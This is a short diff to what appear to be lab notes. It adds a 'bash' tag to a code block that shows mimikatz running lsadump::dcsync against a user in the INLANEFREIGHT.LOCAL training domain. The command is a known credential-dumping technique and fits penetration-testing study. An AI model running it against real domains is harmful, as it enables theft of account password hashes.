@@ -301,7 +301,7 @@ lsadump::dcsync /user:INLANEFREIGHT\lab_adm
 
 or:
 
-```
+```bash
 .\mimikatz.exe
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
